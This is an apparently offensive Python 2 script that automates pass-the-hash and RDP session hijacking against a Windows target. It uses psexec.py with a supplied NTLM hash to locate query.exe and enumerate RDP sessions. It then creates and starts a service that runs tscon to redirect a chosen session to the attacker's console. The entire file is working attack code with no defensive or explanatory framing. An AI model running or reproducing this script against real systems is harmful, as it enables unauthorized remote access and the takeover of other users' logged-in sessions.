import sys
import re
from thread import *
import struct
import string
import random
import argparse
import time
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--hash", help="hash for pth")
parser.add_argument("-d", "--domain", help="domain")
parser.add_argument("-u", "--user", help="user")
parser.add_argument("-t", "--target", help="target")

args = parser.parse_args()

command = args.target

#Search Query
command_Squery = "psexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:%s %s/%s@%s" % (args.hash, args.domain, args.user, args.target)
command_Squery = command_Squery + " 'cmd /c C: & cd C:\Windows\winsxs & dir /s /b query.exe'"
print "command: " + command_Squery
direct_output = subprocess.check_output([command_Squery], shell=True, stderr=subprocess.STDOUT)
print direct_output

direct_output_splited = direct_output.splitlines()
print "############################################################################"
for line in direct_output_splited:
	if "query.exe" in line:
	   query = line
	   print query
	   break
print "############################################################################"


#Run Rdesktop

rd_command = "rdesktop " + args.target + " &"
print rd_command
direct_output = subprocess.Popen(rd_command, shell=True)
print "############################################################################"

#Run Query.exe
command_query = " -hashes AAD3B435B51404EEAAD3B435B51404EE:%s %s/%s@%s"% (args.hash,args.domain,args.user,args.target)
command_query = 'psexec.py' + command_query + " '" + query[1:] + " session'"
print "############################################################################"
print command_query
print "############################################################################"
output = subprocess.check_output([command_query], shell=True, stderr=subprocess.STDOUT)
print output


#Search rdp session to hijack 

direct_output = output.split("rdp-tcp#")
conn = "rdp-tcp#" + direct_output[1].split(" ")[0] #"0"
print "############################################################################"
print conn
print "############################################################################"

#create session hijacking service
sc_create_command = "psexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:%s %s/%s@%s"% (args.hash,args.domain,args.user,args.target)
sc_create_command = sc_create_command + ' sc create omri binPath= \\"cmd.exe /k tscon 1 /dest:%s\\"' % conn
print "command: " + sc_create_command
direct_output = subprocess.check_output([sc_create_command], shell=True, stderr=subprocess.STDOUT)
print direct_output
#Run the service, and get RDP console session
sc_create_command = "psexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:%s %s/%s@%s" % (args.hash, args.domain, args.user, args.target)
sc_create_command = sc_create_command + ' sc start omri'
print "command: " + sc_create_command
direct_output = subprocess.check_output([sc_create_command], shell=True, stderr=subprocess.STDOUT)
print direct_output
